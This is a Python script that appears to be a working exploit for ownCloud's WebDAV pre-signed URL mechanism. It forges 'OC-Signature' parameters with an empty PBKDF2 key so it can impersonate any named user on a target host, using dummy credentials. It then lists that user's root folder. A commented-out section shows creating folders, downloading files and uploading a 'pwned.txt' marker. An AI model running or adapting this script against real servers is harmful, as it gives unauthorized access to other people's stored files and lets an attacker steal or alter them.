import logging
import requests
import platform
import hashlib
import tempfile
import argparse
import easywebdav.client
import easywebdav
import re
from easywebdav.client import *
# for monkey patching presign url
from datetime import datetime, timezone
from hashlib import pbkdf2_hmac
easywebdav.basestring = str
easywebdav.client.basestring = str
# fixing basestring weird error

py_majversion, py_minversion, py_revversion = platform.python_version_tuple()
if py_majversion == '2':
    from urlparse import urlparse, urlunparse, parse_qs, urlencode
else:
    from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

def normalize_url(url):
    # Replace multiple slashes with double slashes
    normalized_url = re.sub(r'/+', '/', url)
    return normalized_url

def sign(url, method):
    ''' sign with '' key '''
    global username
    parsed_url = urlparse(url)
    if (parsed_url.port == 80 and parsed_url.scheme == 'http') \
        or (parsed_url.port == 443 and parsed_url.scheme == 'https'):
        netloc = parsed_url.hostname
    else:
        netloc = parsed_url.netloc
    
    

    new_param = {}
    new_param['OC-Credential'] = username
    current_time_utc = datetime.now(timezone.utc)
    new_param['OC-Date'] = current_time_utc.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    new_param['OC-Expires'] = '86400'
    new_param['OC-Verb'] = method
    
    query_params = parse_qs(parsed_url.query)
    query_params.update(new_param)
    new_query_string = urlencode(query_params, doseq=True)
    reconstructed_url = urlunparse((parsed_url.scheme, netloc, normalize_url(parsed_url.path), parsed_url.params, new_query_string, parsed_url.fragment))

    key = pbkdf2_hmac('sha512', reconstructed_url.encode(), b'', 10000, dklen=32)
    hex_key = key.hex()
    new_param['OC-Signature'] = key.hex()
    new_param['OC-Algo'] = 'PBKDF2/10000-SHA512'
    parsed_url = urlparse(reconstructed_url)
    query_params.update(new_param)
    new_query_string = urlencode(query_params, doseq=True)
    reconstructed_url = urlunparse((parsed_url.scheme, netloc, parsed_url.path, parsed_url.params, new_query_string, parsed_url.fragment))

    logging.debug(f'{method} : {reconstructed_url}')
    return reconstructed_url


def new_send(self, method, path, expected_code, **kwargs):
        url = self._get_url(path)
        url = sign(url, method)
        response = self.session.request(method, url, allow_redirects=False, **kwargs)
        if isinstance(expected_code, Number) and response.status_code != expected_code \
            or not isinstance(expected_code, Number) and response.status_code not in expected_code:
            raise OperationFailed(method, path, expected_code, response.status_code)
        return response

easywebdav.Client._send = new_send

def main():
    global username
    # Set up argument parsing
    parser = argparse.ArgumentParser(description='M0V. & ChatGPT')
    parser.add_argument('-v','--verbose', help='increase output verbosity', action='store_true', dest="verbose")
    parser.add_argument('-s','--sign', help='sign a single url with GET method', dest="urltosign")
    parser.add_argument('-u', '--username', help='specify a username', required=True, dest="username")
    parser.add_argument('-t', '--target', help='specify a host, should NOT ends with "/remote.php/webdav/"', required=True, dest="target")
    
    args = parser.parse_args()
    
    # Configure logging
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)
    
    username = args.username
    logging.info(f'Pwning {username}!')

    if args.urltosign!=None:
        # or just "sign"
        logging.info(sign(args.urltosign, 'GET'))
        return
    
    parsed_target = urlparse(args.target)
    webdav = easywebdav.connect(parsed_target.hostname, port=parsed_target.port, protocol=parsed_target.scheme, path = parsed_target.path + "/remote.php/webdav/", username=':)', password=':)')
    
    logging.info(f"{username}'s root folder content")
    for entity in webdav.ls(""):
        logging.info(entity)
    '''
    # dont do this
    webdav.mkdir('some_dir', safe=True)
    webdav.download('ccc.txt', '/tmp/ccc')
    with tempfile.SpooledTemporaryFile(max_size=1024 * 1024, mode='bw+') as temp_file:
        temp_file.write(b"Pwned.")
        temp_file.seek(0)
        webdav.upload(temp_file, 'pwned.txt')
    '''

if __name__ == '__main__':
    main()